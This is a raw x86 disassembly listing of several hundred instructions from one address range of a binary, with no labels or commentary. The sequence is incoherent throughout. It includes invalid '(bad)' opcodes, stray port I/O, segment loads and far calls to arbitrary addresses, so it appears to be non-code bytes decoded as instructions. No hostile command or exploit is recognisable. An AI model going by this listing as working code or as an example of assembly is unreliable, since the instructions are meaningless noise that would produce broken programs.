  419c9a:	imul   edi,DWORD PTR [ebp-0x57],0xffffffd9
  419c9e:	sbb    bh,0xf8
  419ca1:	ret    
  419ca2:	loopne 0x419c43
  419ca4:	mov    gs,edx
  419ca6:	rol    BYTE PTR [esi+0xc],1
  419ca9:	in     eax,dx
  419caa:	cmp    eax,0xa50b55be
  419caf:	gs ret 0xd637
  419cb3:	dec    ebp
  419cb4:	add    eax,0xe7f0c782
  419cb9:	std    
  419cba:	sub    al,BYTE PTR [eax]
  419cbc:	test   al,0x38
  419cbe:	adc    eax,0x5cd68fde
  419cc3:	or     eax,0x436eaf64
  419cc8:	in     al,dx
  419cc9:	mov    dl,0xf3
  419ccb:	dec    ebp
  419ccc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ccd:	imul   esi,DWORD PTR [edx*2-0x245c4197],0x6d27b4bb
  419cd8:	and    eax,0x73ece4b0
  419cdd:	out    0x9,eax
  419cdf:	mov    DWORD PTR [edi+0x10ef5624],edx
  419ce5:	jle    0x419cee
  419ce7:	cmp    eax,DWORD PTR [ecx+0x7b46a235]
  419ced:	dec    ecx
  419cee:	inc    ebp
  419cef:	pop    ecx
  419cf0:	or     BYTE PTR [edx+0x6a75ffab],0x4e
  419cf7:	ja     0x419cb2
  419cf9:	fwait
  419cfa:	inc    esp
  419cfb:	gs jg  0x419d33
  419cfe:	adc    al,0xdf
  419d00:	ins    BYTE PTR es:[edi],dx
  419d01:	jg     0x419d68
  419d03:	daa    
  419d04:	not    ecx
  419d06:	push   edx
  419d07:	mov    cl,0x5f
  419d09:	(bad)  
  419d0a:	lods   al,BYTE PTR ds:[esi]
  419d0b:	es sub al,0xf9
  419d0e:	(bad)  [esi]
  419d10:	pop    ss
  419d11:	pop    esp
  419d12:	in     eax,dx
  419d13:	ret    0xad3e
  419d16:	xor    BYTE PTR [edx-0x4182148a],bh
  419d1c:	inc    edx
  419d1d:	or     ebp,DWORD PTR [ebx+0x3e]
  419d20:	dec    edi
  419d21:	push   es
  419d22:	daa    
  419d23:	xchg   esi,eax
  419d24:	jle    0x419ce3
  419d26:	and    esi,DWORD PTR [edx+0x1efe0be9]
  419d2c:	js     0x419cb1
  419d2e:	add    ebx,ebp
  419d30:	or     DWORD PTR [ebp+0x47],edx
  419d33:	sub    ebp,DWORD PTR ds:0x74bb6d00
  419d39:	push   0x6f
  419d3b:	pop    ecx
  419d3c:	mov    ds:0xdfbff278,eax
  419d41:	je     0x419d04
  419d43:	push   ebx
  419d44:	mov    dl,0xf0
  419d46:	fadd   st,st(1)
  419d48:	fwait
  419d49:	scas   al,BYTE PTR es:[edi]
  419d4a:	mov    eax,0x1a325c33
  419d4f:	pop    es
  419d50:	sbb    eax,0xa811ca8b
  419d55:	lods   eax,DWORD PTR ds:[esi]
  419d56:	xor    DWORD PTR [edx+0x34],0xb9c2f7ad
  419d5d:	int    0x6
  419d5f:	or     cl,BYTE PTR [edx-0x3af86f91]
  419d65:	scas   al,BYTE PTR es:[edi]
  419d66:	push   esp
  419d67:	(bad)  [ebp*2+0x53fe52d6]
  419d6e:	jmp    0x419d0a
  419d70:	(bad)  
  419d71:	and    edx,DWORD PTR [edi-0x69ecb85f]
  419d77:	add    eax,0xc3bb3d60
  419d7c:	or     eax,0x1c357fe3
  419d81:	loope  0x419d94
  419d83:	cmp    eax,0xbe56164a
  419d88:	adc    eax,0x17f98eb6
  419d8d:	dec    esi
  419d8e:	js     0x419d74
  419d90:	sbb    al,0x8d
  419d92:	xor    edx,edi
  419d94:	rol    ebx,0x81
  419d97:	(bad)  
  419d98:	call   0x46b8e2b
  419d9d:	popa   
  419d9e:	add    BYTE PTR [edi-0x7d],dl
  419da1:	jno    0x419dea
  419da3:	iret   
  419da4:	pop    ecx
  419da5:	mov    ebx,0xaa16f61d
  419daa:	pop    esi
  419dab:	sbb    DWORD PTR [esi-0x6e],eax
  419dae:	push   ecx
  419daf:	xor    al,0x78
  419db1:	adc    DWORD PTR [ebx],ebp
  419db3:	push   ss
  419db4:	popa   
  419db5:	adc    BYTE PTR [eax],dl
  419db7:	xchg   edx,eax
  419db8:	xchg   ebp,eax
  419db9:	fyl2x  
  419dbb:	ror    DWORD PTR [ebx],0xaf
  419dbe:	pop    ecx
  419dbf:	or     DWORD PTR ds:[esi+0x450b00a4],eax
  419dc6:	push   es
  419dc7:	push   ss
  419dc8:	cmp    BYTE PTR [esp+ebp*8],ch
  419dcb:	push   esp
  419dcc:	xchg   edi,eax
  419dcd:	mov    WORD PTR [eax],es
  419dcf:	and    al,0x4f
  419dd1:	fidivr DWORD PTR [edi+0x353ed133]
  419dd7:	jo     0x419d5e
  419dd9:	xchg   ebx,eax
  419dda:	popf   
  419ddb:	test   DWORD PTR [ecx],ebp
  419ddd:	sbb    ebp,eax
  419ddf:	aam    0x47
  419de1:	and    ebx,ecx
  419de3:	xchg   esi,eax
  419de4:	push   0xffffffd4
  419de6:	out    dx,al
  419de7:	or     BYTE PTR [edx],cl
  419de9:	rcr    BYTE PTR [eax+0x7745821f],1
  419def:	fisttp DWORD PTR ds:[edx]
  419df2:	sub    BYTE PTR [ebp+ecx*1-0x33],0x68
  419df7:	dec    edx
  419df8:	xlat   BYTE PTR ds:[ebx]
  419df9:	cwde   
  419dfa:	cmp    eax,0x2d2f60d3
  419dff:	sbb    eax,0xed7ad7d6
  419e04:	repz sar BYTE PTR [eax],cl
  419e07:	and    DWORD PTR [edi],ebx
  419e09:	sbb    al,0xe6
  419e0b:	ret    
  419e0c:	repnz sbb BYTE PTR [edx-0x66],bl
  419e10:	mov    bl,0xdc
  419e12:	inc    eax
  419e13:	push   ebx
  419e14:	js     0x419de9
  419e16:	xchg   ebx,eax
  419e17:	retf   0x4966
  419e1a:	inc    esp
  419e1b:	ret    0x8168
  419e1e:	cs push ebp
  419e20:	call   0xd7e7:0x5af333a
  419e27:	mov    ah,0xa1
  419e29:	adc    ch,BYTE PTR [ecx]
  419e2b:	js     0x419e96
  419e2d:	out    dx,eax
  419e2e:	rcr    ebp,cl
  419e30:	mov    ?,ebp
  419e32:	fld    TBYTE PTR [eax-0x5d]
  419e35:	clc    
  419e36:	pusha  
  419e37:	inc    esp
  419e38:	dec    edi
  419e39:	mov    bh,0xe4
  419e3b:	xchg   ebx,eax
  419e3c:	pop    ds
  419e3d:	or     al,0xc
  419e3f:	jmp    0x40d9b5b2
  419e44:	dec    ebp
  419e45:	out    0xc3,eax
  419e47:	mov    esp,0x36f96ade
  419e4c:	sub    al,0x2f
  419e4e:	(bad)  
  419e4f:	imul   edx,DWORD PTR [ecx],0x7e7ac805
  419e55:	daa    
  419e56:	adc    al,0xa5
  419e58:	adc    cl,BYTE PTR [esi-0x5d]
  419e5b:	adc    DWORD PTR [ebx+0x3a],ebp
  419e5e:	push   eax
  419e5f:	scas   al,BYTE PTR es:[edi]
  419e60:	lea    esp,[ebx]
  419e62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e63:	sbb    eax,0xbeba281f
  419e68:	mov    cl,BYTE PTR [ecx]
  419e6a:	(bad)  
  419e6b:	icebp  
  419e6c:	mov    dl,BYTE PTR [esi-0xf]
  419e6f:	dec    edi
  419e70:	aad    0x3d
  419e72:	sbb    edx,DWORD PTR [ecx+0x277d75a4]
  419e78:	sar    DWORD PTR [edi+0x6a],1
  419e7b:	and    BYTE PTR [eax-0x3f6e9881],0x5d
  419e82:	and    DWORD PTR [esi+edx*4+0x429684b5],edx
  419e89:	push   eax
  419e8a:	aam    0x31
  419e8c:	call   0x95ed66d6
  419e91:	sbb    DWORD PTR [esi-0x6f],edx
  419e94:	cld    
  419e95:	adc    BYTE PTR [esi+0x5efc62de],cl
  419e9b:	test   edx,ecx
  419e9d:	rol    BYTE PTR [edi+0xbd14801],cl
  419ea3:	inc    ecx
  419ea4:	and    esi,DWORD PTR [edx]
  419ea6:	push   ebp
  419ea7:	enter  0x4e62,0x13
  419eab:	inc    ebp
  419eac:	cdq    
  419ead:	push   es
  419eae:	cmp    DWORD PTR [ecx+0x61],edx
  419eb1:	xchg   BYTE PTR [ecx],dl
  419eb3:	cmp    ebx,DWORD PTR [edx+ecx*8+0x3fee83a1]
  419eba:	mov    ds:0x9d8950f,al
  419ebf:	js     0x419f3f
  419ec1:	and    bl,BYTE PTR ds:0x59f2d5ba
  419ec7:	stos   BYTE PTR es:[edi],al
  419ec8:	test   DWORD PTR [eax+0x663b5f1c],esi
  419ece:	xor    eax,0x5bcddaa7
  419ed3:	ds push cs
  419ed5:	xchg   esp,eax
  419ed6:	pop    ebp
  419ed7:	pop    esi
  419ed8:	xor    eax,0xe681acc9
  419edd:	jecxz  0x419ef7
  419edf:	push   esp
  419ee0:	sub    al,0x7c
  419ee2:	dec    ebx
  419ee3:	add    BYTE PTR ds:0x30ad1b30,bh
  419ee9:	push   eax
  419eea:	sahf   
  419eeb:	pop    ebp
  419eec:	pop    edi
  419eed:	enter  0xd7da,0x35
  419ef1:	gs push edi
  419ef3:	mov    cl,0x4b
  419ef5:	retf   
  419ef6:	jmp    0xdac3:0xe1aa1756
  419efd:	(bad)  
  419efe:	or     ebx,DWORD PTR [eax-0x6e14dc85]
  419f04:	call   0x9e4a9ef
  419f09:	push   ds
  419f0a:	scas   al,BYTE PTR es:[edi]
  419f0b:	ficom  WORD PTR [ebp+0x12c83170]
  419f11:	xchg   ebx,eax
  419f12:	nop
  419f13:	mov    cl,0xbc
  419f15:	outs   dx,DWORD PTR ds:[esi]
  419f16:	dec    ebp
  419f17:	push   edi
  419f18:	call   0xea8e:0x42d66b77
  419f1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f20:	add    DWORD PTR [edx+0x4a],0xffffffbb
  419f24:	into   
  419f25:	stc    
  419f26:	outs   dx,BYTE PTR ds:[esi]
  419f27:	or     BYTE PTR [ebp+0x67f235bd],0xf6
  419f2e:	repz jne 0x419f07
  419f31:	or     ax,0x9e2f
  419f35:	mov    bh,0x35
  419f37:	jg     0x419ecd
  419f39:	arpl   bp,di
  419f3b:	lea    ebp,[ebp-0xd]
  419f3e:	sbb    ch,BYTE PTR [edi-0x52]
  419f41:	xchg   ebp,eax
  419f42:	cmc    
  419f43:	aam    0xb
  419f45:	into   
  419f46:	test   al,0xaa
  419f48:	(bad)  
  419f49:	mov    cl,0x25
  419f4b:	or     ebx,DWORD PTR [ebx]
  419f4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f4e:	popf   
  419f4f:	retf   0x6f4a
  419f52:	adc    al,0x98
  419f54:	jecxz  0x419f65
  419f56:	push   cs
  419f57:	or     al,0xb2
  419f59:	mov    ds:0x3133152a,eax
  419f5e:	mov    cl,0x8a
  419f60:	(bad)  
  419f61:	cld    
  419f62:	fadd   QWORD PTR [edx-0x6c3dce66]
  419f68:	push   esp
  419f69:	mov    ds:0xfff29b20,eax
  419f6e:	xchg   ebp,eax
  419f6f:	cmp    dl,BYTE PTR [esi-0x2daccefa]
  419f75:	pop    ebx
  419f76:	xlat   BYTE PTR ds:[ebx]
  419f77:	mov    al,0xaf
  419f79:	xchg   BYTE PTR [esi+edx*8-0x71],al
  419f7d:	lods   al,BYTE PTR ds:[esi]
  419f7e:	mov    ah,bl
  419f80:	inc    esi
  419f81:	inc    esi
  419f82:	pop    esp
  419f83:	div    DWORD PTR [ebx]
  419f85:	sbb    ah,BYTE PTR [ebx+0x20c90c06]
  419f8b:	cmp    DWORD PTR [edx+0x5],edi
  419f8e:	xor    al,0xf7
  419f90:	pop    esp
  419f91:	fild   DWORD PTR [ebx+0x60e94207]
  419f97:	rcl    DWORD PTR [esi-0x3d],cl
  419f9a:	push   ds
  419f9b:	jae    0x419f23
  419f9d:	nop
  419f9e:	ins    DWORD PTR es:[edi],dx
  419f9f:	fiadd  DWORD PTR [eax+0x9183dea]
  419fa5:	out    dx,eax
  419fa6:	and    DWORD PTR [esp+edx*1-0xd226ab1],edi
  419fad:	pop    edx
  419fae:	xchg   ah,dl
  419fb0:	inc    ebx
  419fb1:	xchg   edi,eax
  419fb2:	pop    es
  419fb3:	xor    ecx,ebx
  419fb5:	jmp    0x419fb3
  419fb7:	sbb    al,0xf2
  419fb9:	add    bh,bl
  419fbb:	or     DWORD PTR [ebx+0x6e],ebp
  419fbe:	or     eax,0xc051117d
  419fc3:	jbe    0x41a037
  419fc5:	fwait
  419fc6:	iret   
  419fc7:	int3   
  419fc8:	das    
  419fc9:	or     eax,0x6315d842
  419fce:	dec    esp
  419fcf:	jno    0x41a01f
  419fd1:	jns    0x419f6f
  419fd3:	push   ds
  419fd4:	add    DWORD PTR [esi],edx
  419fd6:	and    dl,BYTE PTR [ebp+0x7ba4686f]
  419fdc:	in     eax,dx
  419fdd:	add    BYTE PTR [esi+0x4],bh
  419fe0:	push   esp
  419fe1:	adc    al,dh
  419fe3:	add    eax,0x655c82c6
  419fe8:	push   edx
  419fe9:	mov    ch,0x87
  419feb:	or     ebp,DWORD PTR [edx-0x7d47fd55]
  419ff1:	xor    DWORD PTR [ecx+0x20954556],ecx
  419ff7:	(bad)  
  419ff8:	sbb    al,0x10
  419ffa:	pop    es
  419ffb:	xor    eax,0x320caca8
  41a000:	test   al,0xab
  41a002:	test   al,0xfb
  41a004:	std    
  41a005:	mov    ds:0x596ea681,al
  41a00a:	inc    edx
  41a00b:	leave  
  41a00c:	jmp    0x419fa5
  41a00e:	dec    ebx
  41a00f:	mov    ah,0x96
  41a011:	xchg   ebp,eax
  41a012:	xor    ebp,eax
  41a014:	jmp    0x41a095
  41a016:	fnstsw WORD PTR [edi*8-0x50d263b0]
  41a01d:	mov    bh,0x31
  41a01f:	cld    
  41a020:	add    al,0xf8
  41a022:	ds mov al,cl
  41a025:	dec    esi
  41a026:	sbb    BYTE PTR [ebx+edx*8-0x73],cl
  41a02a:	fdivr  QWORD PTR [edx+eiz*2]
  41a02d:	fld    QWORD PTR ds:[si+0x7f]
  41a032:	bound  ebp,QWORD PTR [edi]
  41a034:	aam    0x19
  41a036:	stos   DWORD PTR es:[edi],eax
  41a037:	xlat   BYTE PTR ds:[ebx]
  41a038:	outs   dx,BYTE PTR ds:[esi]
  41a039:	sbb    DWORD PTR [esi+0x7ad3fa34],edi
  41a03f:	fstp   QWORD PTR [edx]
  41a041:	dec    ebx
  41a042:	outs   dx,BYTE PTR ds:[esi]
  41a043:	fwait
  41a044:	ds or  eax,edx
  41a047:	lahf   
  41a048:	in     al,0x76
  41a04a:	adc    eax,0x4b7c13a0
  41a04f:	jmp    0x41a0a6
  41a051:	xchg   ebp,eax
  41a052:	push   ebp
  41a053:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a054:	mov    bl,0xbc
  41a056:	jmp    0xb75d:0x1938dc84
  41a05d:	adc    dl,BYTE PTR [esi+0x209ef15e]
  41a063:	sbb    DWORD PTR [ecx],esp
  41a065:	mov    ecx,0xa6bc7740
  41a06a:	data16 loope 0x41a0d5
  41a06d:	in     al,dx
  41a06e:	sbb    al,BYTE PTR [eax+0x7ff70396]
  41a074:	fs inc ebp
  41a076:	sahf   
  41a077:	mov    eax,ds:0x30e6fc74
  41a07c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a07d:	js     0x41a0d8
  41a07f:	xor    dl,BYTE PTR ds:0x43392016
  41a085:	outs   dx,BYTE PTR ds:[esi]
  41a086:	(bad)  
  41a087:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a088:	(bad)  
  41a08a:	xchg   bh,al
  41a08c:	aam    0xdf
  41a08e:	mov    edx,0xeffa2717
  41a093:	xchg   ebx,eax
  41a094:	aaa    
  41a095:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a097:	fcomp  QWORD PTR [esi]
  41a099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a09a:	push   ds
  41a09b:	mov    ah,0xcb
  41a09d:	jbe    0x41a0b7
  41a09f:	lea    ecx,[eax-0xb]
  41a0a2:	test   al,0x7e
  41a0a4:	pop    esi
  41a0a5:	popf   
  41a0a6:	aam    0xb3
  41a0a8:	xor    BYTE PTR [ebp+0x68b09fbf],al
  41a0ae:	repz sub BYTE PTR gs:[eax-0x34],al
  41a0b3:	pop    ecx
  41a0b4:	lds    esi,FWORD PTR [ebp-0xd]
  41a0b7:	enter  0xba7b,0x86
  41a0bb:	add    esi,DWORD PTR [ebx]
  41a0bd:	jg     0x41a044
  41a0bf:	xchg   ecx,eax
  41a0c0:	(bad)  [ecx-0x4]
  41a0c3:	xchg   BYTE PTR [edi+0x54],dl
  41a0c6:	or     ch,ch
  41a0c8:	push   esp
  41a0c9:	sub    al,0x68
  41a0cb:	(bad)  
  41a0cc:	mov    esp,0x86a632e4
  41a0d1:	fldenv fs:[edi+0x309178ff]
  41a0d8:	retf   0xfe5d
  41a0db:	pop    ecx
  41a0dc:	lahf   
  41a0dd:	jo     0x41a067
  41a0df:	mov    edi,0x7e8d18db
  41a0e4:	jp     0x41a0b1
  41a0e6:	out    dx,al
  41a0e7:	jge    0x41a09c
  41a0e9:	dec    eax
  41a0ea:	or     eax,0xb19b0c08
  41a0ef:	ror    bh,cl
  41a0f1:	add    bl,BYTE PTR [esi]
  41a0f3:	neg    DWORD PTR [esi]
  41a0f5:	pop    esi
  41a0f6:	das    
  41a0f7:	inc    ecx
  41a0f8:	mov    cl,0xb4
  41a0fa:	shr    DWORD PTR [eax-0x1d],cl
  41a0fd:	fcmovnb st,st(6)
  41a0ff:	clc    
  41a100:	fdiv   QWORD PTR [esi+0x4f562ae6]
  41a106:	ins    BYTE PTR es:[edi],dx
  41a107:	push   cs
  41a108:	repz bound esp,QWORD PTR [eax+0x263d71c8]
  41a10f:	dec    ebx
  41a110:	cmc    
  41a111:	mov    esp,0x9c77802b
  41a116:	push   edx
  41a117:	push   esi
  41a118:	dec    eax
  41a119:	mov    dh,0x4a
  41a11b:	push   eax
  41a11c:	jl     0x41a0f5
  41a11e:	lock add al,0xa6
  41a121:	ja     0x41a0f0
  41a123:	jmp    0x757d:0x56af6058
  41a12a:	push   edx
  41a12b:	sub    bl,dl
  41a12d:	adc    al,0x93
  41a12f:	dec    edx
  41a130:	call   0x12f09420
  41a135:	inc    esp
  41a136:	int3   
  41a137:	pusha  
  41a138:	jns    0x41a14a
  41a13a:	aas    
  41a13b:	in     eax,dx
  41a13c:	fild   QWORD PTR [ebx+0x7e]
  41a13f:	adc    eax,0x9c7511c2
  41a144:	jl     0x41a10e
  41a146:	call   0xde90:0x2b124ab6
  41a14d:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41a14f:	jp     0x41a15f
  41a151:	cmp    al,0xee
  41a153:	loopne 0x41a183
  41a155:	mov    esp,0x7740981
  41a15a:	lds    esp,FWORD PTR [edx]
  41a15c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a15d:	and    ah,BYTE PTR [edx+eiz*2+0x3002e719]
  41a164:	std    
  41a165:	mov    ah,0xb7
  41a167:	lahf   
  41a168:	inc    ecx
  41a169:	scas   al,BYTE PTR es:[edi]
  41a16a:	jle    0x41a1cf
  41a16c:	jbe    0x41a1df
  41a16e:	push   ds
  41a16f:	and    bh,BYTE PTR [edi]
  41a171:	or     ecx,DWORD PTR [edx-0x25]
  41a174:	ja     0x41a1dc
  41a176:	adc    BYTE PTR [edx+0xbae6e6a],0xb5
  41a17d:	call   0xd8a85e82
  41a182:	push   edi
  41a183:	xchg   ecx,eax
  41a184:	ror    BYTE PTR [ebx],cl
  41a186:	addr16 push ebp
  41a188:	and    BYTE PTR [eax+ebp*2],bh
  41a18b:	ins    BYTE PTR es:[edi],dx
  41a18c:	ss into 
  41a18e:	lods   al,BYTE PTR ds:[esi]
  41a18f:	mov    ch,BYTE PTR [esi-0xd]
  41a192:	call   0x5360:0x33da30c6
  41a199:	xor    esi,DWORD PTR [edi]
  41a19b:	push   ebp
  41a19c:	outs   dx,BYTE PTR ds:[esi]
  41a19d:	fwait
  41a19e:	adc    eax,0x7e81a9dd
  41a1a3:	sar    DWORD PTR [ecx+eiz*8+0x61],1
  41a1a7:	adc    al,0x82
  41a1a9:	ds rcl dl,0xae
  41a1ad:	dec    ebx
  41a1ae:	mov    edi,0xcb60488a
  41a1b3:	mov    ecx,0xb1889c74
  41a1b8:	sub    al,0xac
  41a1ba:	xchg   esp,eax
  41a1bb:	dec    eax
  41a1bc:	jmp    0xc315ed55
  41a1c1:	repnz int3 
  41a1c3:	dec    esi
  41a1c4:	xor    al,0xad
  41a1c6:	push   edi
  41a1c7:	and    BYTE PTR [eax+ebp*2],dl
  41a1ca:	dec    BYTE PTR [esi-0x6d8a4c58]
  41a1d0:	aam    0x7f
  41a1d2:	scas   al,BYTE PTR es:[edi]
  41a1d3:	hlt    
  41a1d4:	aam    0x24
  41a1d6:	std    
  41a1d7:	mov    ecx,0xee948cdf
  41a1dc:	cmp    ebx,esp
  41a1de:	sbb    eax,0x2055ff4
  41a1e3:	pop    edx
  41a1e4:	stos   DWORD PTR es:[edi],eax
  41a1e5:	aas    
  41a1e6:	retf   
  41a1e7:	mov    ch,cl
  41a1e9:	outs   dx,DWORD PTR ds:[esi]
  41a1ea:	outs   dx,DWORD PTR ds:[esi]
  41a1eb:	call   0xf225c7d
  41a1f0:	inc    ebp
  41a1f1:	mov    ch,0xc1
  41a1f3:	mov    BYTE PTR [edx-0x27],ah
  41a1f6:	test   DWORD PTR [esi-0x6743b72c],edi
  41a1fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1fd:	cmp    eax,0xc8d88051
  41a202:	test   BYTE PTR [eax-0x7b51a747],0x21
  41a209:	push   ds
  41a20a:	dec    ecx
  41a20b:	in     al,dx
  41a20c:	std    
  41a20d:	mov    eax,ds:0x3e9e2153
  41a212:	push   eax
  41a213:	hlt    
  41a214:	xchg   esp,eax
  41a215:	xor    BYTE PTR [ecx],cl
  41a217:	push   ebx
  41a218:	arpl   WORD PTR [ecx+edx*2+0x7f],cx
  41a21c:	loop   0x41a1d6
  41a21e:	aad    0x2b
  41a220:	and    ecx,edi
  41a222:	dec    esi
  41a223:	inc    edx
  41a224:	jbe    0x41a242
  41a226:	ja     0x41a20f
  41a228:	sub    ecx,DWORD PTR [ecx]
  41a22a:	sahf   
  41a22b:	pop    ecx
  41a22c:	jg     0x41a297
  41a22e:	inc    DWORD PTR [edi]
  41a230:	leave  
  41a231:	and    BYTE PTR [edi],0x4d
  41a234:	mov    DWORD PTR [edi],eax
  41a236:	add    BYTE PTR ds:0xb39cdadc,dl
  41a23c:	push   cs
  41a23d:	pop    ebx
  41a23e:	jo     0x41a2a4
  41a240:	mov    al,ds:0x8763a670
  41a245:	and    al,0xf3
  41a247:	push   cs
  41a248:	ins    BYTE PTR es:[edi],dx
  41a249:	pop    es
  41a24a:	xchg   ebp,eax
  41a24b:	cmp    eax,0x58bbc356
  41a250:	rcr    BYTE PTR [ecx+0x10db4f0d],cl
  41a256:	jb     0x41a272
  41a258:	(bad)  
  41a259:	mov    cl,0x34
  41a25b:	call   0xcbd4:0xf32249cd
  41a262:	xor    dh,dl
  41a264:	jbe    0x41a1fe
  41a266:	mov    ebx,0x86f5a6db
  41a26b:	std    
  41a26c:	lds    ecx,FWORD PTR [eax]
  41a26e:	jbe    0x41a223
  41a270:	retf   0x176e
  41a273:	les    ebp,FWORD PTR [edx+0x72]
  41a276:	lods   eax,DWORD PTR ds:[esi]
  41a277:	add    al,BYTE PTR ds:0xe727fb19
  41a27d:	push   esp
  41a27e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a27f:	mov    ah,0x83
  41a281:	(bad)  
  41a282:	sti    
  41a283:	dec    ebp
  41a284:	shr    BYTE PTR [eax-0x7d],cl
  41a287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a288:	fisubr WORD PTR [ebp*4+0x1410168f]
  41a28f:	cmp    BYTE PTR [edi-0x4],dh
  41a292:	xor    eax,0x6368e2c9
  41a297:	push   ds
  41a298:	pusha  
  41a299:	or     al,0x94
  41a29b:	shr    DWORD PTR [edi-0x1cdacba4],1
  41a2a1:	mov    edx,0x6a9ce189
  41a2a6:	mov    ds,ebp
  41a2a8:	push   eax
  41a2a9:	pop    edi
  41a2aa:	mov    edx,0xe2330112
  41a2af:	lods   al,BYTE PTR ds:[esi]
  41a2b0:	aam    0x21
  41a2b2:	lods   eax,DWORD PTR ds:[esi]
  41a2b3:	cmp    esp,DWORD PTR ds:0x1676164a
  41a2b9:	xor    DWORD PTR [esi],esi
  41a2bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2bc:	ss inc eax
  41a2be:	push   esi
  41a2bf:	dec    edx
  41a2c0:	nop
  41a2c1:	push   ds
  41a2c2:	sar    DWORD PTR [esi],1
  41a2c4:	push   edi
  41a2c5:	(bad)  
  41a2c7:	into   
  41a2c8:	jno    0x41a24c
  41a2ca:	ins    DWORD PTR es:[edi],dx
  41a2cb:	or     ebp,DWORD PTR [edx+0x13935909]
  41a2d1:	call   0x68db97b6
  41a2d6:	jae    0x41a2e1
  41a2d8:	loope  0x41a316
  41a2da:	aam    0xd4
  41a2dc:	enter  0xd4dd,0x8b
  41a2e0:	push   0x2
  41a2e2:	fxch   st(3)
  41a2e4:	push   0xf40a8300
  41a2e9:	das    
  41a2ea:	mov    dl,0x4b
  41a2ec:	fs (bad) 
  41a2ee:	mov    ecx,0xad358757
  41a2f3:	inc    eax
  41a2f4:	fcmovb st,st(1)
  41a2f6:	pop    gs
  41a2f8:	add    esp,DWORD PTR [ebx-0x78]
  41a2fb:	jmp    0xa349:0xefeb2837
  41a302:	fadd   st,st(1)
  41a304:	sub    BYTE PTR [ecx-0x3e6753db],ah
  41a30a:	(bad)  
  41a30b:	jg     0x41a303
  41a30d:	sbb    DWORD PTR [ebp+0x6fc24e40],ebp
  41a313:	sub    DWORD PTR [esi],ebx
  41a315:	retf   0xa40
  41a318:	jbe    0x41a328
  41a31a:	or     dl,BYTE PTR [eax+0x728dd8f4]
  41a320:	sub    dl,BYTE PTR [edi+0x16]
  41a323:	pop    esp
  41a324:	(bad)  
  41a325:	jg     0x41a2d2
  41a327:	push   es
  41a328:	mov    DWORD PTR [eax-0x3aad603f],esp
  41a32e:	iret   
  41a32f:	adc    ebp,edi
  41a331:	mov    dh,0x23
  41a333:	adc    eax,0x5fdc5213
  41a338:	fisttp DWORD PTR [eax+0x20]
  41a33b:	ror    DWORD PTR [esi],1
  41a33d:	in     al,0xd9
  41a33f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a340:	xchg   ebx,eax
  41a341:	mov    ds:0x670a6d3d,al
  41a346:	lock or BYTE PTR [ecx+0x5c],ah
  41a34a:	scas   al,BYTE PTR es:[edi]
  41a34b:	leave  
  41a34c:	sahf   
  41a34d:	xor    DWORD PTR [eax-0x6c],0xe2751562
  41a354:	nop
  41a355:	jne    0x41a304
  41a357:	inc    esp
  41a358:	jecxz  0x41a2e5
  41a35a:	cmp    ecx,DWORD PTR ds:0x370cf3eb
  41a360:	mov    ds:0xcf583a8b,eax
  41a365:	pop    ecx
  41a366:	push   edi
  41a367:	cld    
  41a368:	fs push esp
  41a36a:	call   0x8b9a36dd
  41a36f:	add    DWORD PTR [ebp-0x4a91b2c1],esp
  41a375:	add    edi,DWORD PTR [ebx+eax*4+0x7c0bf05c]
  41a37c:	stc    
  41a37d:	jp     0x41a353
  41a37f:	es jle 0x41a3e0
  41a382:	cmp    dh,BYTE PTR [esi]
  41a384:	ins    BYTE PTR es:[edi],dx
  41a385:	jbe    0x41a370
  41a387:	out    dx,al
  41a388:	sti    
  41a389:	(bad)  
  41a38b:	jmp    0x41a3c9
  41a38d:	cdq    
  41a38e:	inc    edx
  41a38f:	retf   
  41a390:	lods   al,BYTE PTR ds:[esi]
  41a391:	arpl   WORD PTR [eax-0x8],dx
  41a394:	loop   0x41a37e
  41a396:	mov    dh,0xc8
  41a398:	pusha  
  41a399:	ror    DWORD PTR [esi+0x2f],0xe6
  41a39d:	sar    edi,1
  41a39f:	pop    ds
  41a3a0:	sahf   
  41a3a1:	mov    ebp,0x448a94fd
  41a3a6:	enter  0xea00,0xe
  41a3aa:	dec    edx
  41a3ab:	enter  0x7db0,0x6f
  41a3af:	fisttp DWORD PTR [ecx]
  41a3b1:	add    BYTE PTR [esi],cl
  41a3b3:	xchg   edx,eax
  41a3b4:	out    0x14,al
  41a3b6:	pop    ebp
  41a3b7:	xchg   ecx,eax
  41a3b8:	imul   DWORD PTR [ecx+0x2eb81a4e]
  41a3be:	mov    edi,0x726a184f
  41a3c3:	mov    bh,0xce
  41a3c5:	jno    0x41a3b5
  41a3c7:	lock dec eax
  41a3c9:	or     al,0x93
  41a3cb:	std    
  41a3cc:	adc    bh,BYTE PTR [eax+esi*1]
  41a3cf:	xor    ecx,DWORD PTR [edi-0x46]
  41a3d2:	stc    
  41a3d3:	xor    esi,DWORD PTR [esp+ecx*8-0x4b]
  41a3d7:	sbb    cl,BYTE PTR [edi]
  41a3d9:	ret    
  41a3da:	adc    al,0xa0
  41a3dc:	call   0x1c34:0x8bcad8f3
  41a3e3:	jbe    0x41a3e6
  41a3e5:	sbb    DWORD PTR [eax],ebp
  41a3e7:	sbb    ah,BYTE PTR [edx+0x63c6935f]
  41a3ed:	mov    bl,0xe7
  41a3ef:	push   edx
  41a3f0:	enter  0x8425,0x2f
  41a3f4:	dec    esi
  41a3f5:	sbb    eax,DWORD PTR [esi+0x789af44d]
  41a3fb:	cmp    dh,al
  41a3fd:	ins    DWORD PTR es:[di],dx
  41a3ff:	sbb    eax,0x1ff1aabd
  41a404:	cs add ch,cl
  41a407:	cwde   
